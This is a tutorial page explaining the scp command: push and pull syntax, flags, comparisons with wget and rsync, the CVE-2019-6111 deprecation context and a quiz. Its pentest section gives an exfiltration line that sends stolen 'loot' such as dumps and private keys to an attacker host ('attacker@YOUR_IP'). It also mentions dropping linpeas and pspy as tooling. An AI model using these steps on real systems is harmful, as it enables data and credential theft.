scp 📤

Secure Copy. Move files between machines over an encrypted SSH tunnel.
Same authentication as SSH. Same security. Different verb.

"If SSH is a voice call, scp is you mailing them a folder." 📦
Chapter 01 // Definition

📖 What does scp do?

scp = Secure Copy. It transfers files between two machines using the SSH protocol for authentication and encryption. Syntax mirrors the familiar cp command: source destination.

📝 Think of it like a private courier service

Regular cp is copying a file from one folder to another on your own computer. scp is copying across the internet — but wrapped inside an SSH envelope so nobody on the wire can snoop. Same credentials you use for ssh user@host work for scp user@host:path.

Chapter 02 // Syntax

🧩 The two directions

⬆️ Push: local → remote

scp ./notes.txt \ ubuntu@192.168.1.30:/home/ubuntu/

Send notes.txt to the remote user's home folder.

⬇️ Pull: remote → local

scp ubuntu@192.168.1.30:/etc/passwd \ ./passwd-remote

Grab the remote passwd file, save locally.

Useful flags

  • -r — recursive (copy whole directories)
  • -P 2222 — non-default SSH port (NOTE the capital P — ssh uses lowercase p)
  • -i key.pem — use this SSH private key
  • -C — compress in transit (handy for big transfers over slow links)
  • -p — preserve timestamps and mode (forensics-friendly)
💡 Hot tip: Both ends of the copy can be remote. scp user1@host1:/file user2@host2:/dest routes through YOUR machine. Slow, but sometimes the only option if the two boxes can't talk directly.
the security angle
Chapter 03 // scp in the pentest workflow

🥷 Exfil, staging, and loot

🚨 Classic use cases:
  • Exfil loot. Popped a DB dump, hashes file, private keys. SSH is open to your attack box → scp trophy.tar.gz attacker@YOUR_IP:/loot/.
  • Drop tooling. Upload linpeas.sh, pspy, or a static nmap binary. Inverse of wget's "pull" — here you're pushing.
  • Backup shells you care about. Grab interesting config files before a reboot or cleanup wipes the box.

scp vs wget vs rsync

scp

Needs SSH creds on remote. Encrypted. Both push and pull. Simple syntax.

wget / curl

Only pulls, via HTTP/HTTPS. Doesn't need creds if the server is open. Different protocol, different log trails.

rsync

scp's smarter sibling. Delta-copies (only changed bytes). Can run over SSH. Handles huge trees gracefully.

🧠 Brain Power
Why is scp being deprecated in favor of sftp and rsync on modern systems?

scp's protocol is old, simple, and has had a few CVEs (like CVE-2019-6111 — a malicious server could overwrite extra files on your machine during a pull). OpenSSH 9.0+ made scp use the SFTP protocol underneath by default, but the scp command is still considered legacy. rsync and sftp are more auditable, support partial transfers better, and don't have the "trust the server completely" design flaw.

Chapter 04 // Real-world gotchas

⚠️ Where scp bites you

  • No mkdir. scp won't create missing remote directories. Target path must already exist (except the final filename).
  • Spaces in paths. Need to quote twice — once for your local shell, once for the remote shell. scp "local.txt" 'user@host:"/with spaces/"'.
  • SELinux / AppArmor context. Files copied with scp sometimes land with unexpected security contexts on SELinux-enforcing systems. Fix with restorecon.
  • Huge files choke SSH. For anything over a few GB, switch to rsync with --partial --progress.

🎯 Quick Check

You want to copy the folder /var/backups/ from a remote server to your local ./bk/. Which command?
scp user@host:/var/backups/ ./bk/
scp -r user@host:/var/backups/ ./bk/
scp ./bk/ user@host:/var/backups/
cp -r user@host:/var/backups/ ./bk/
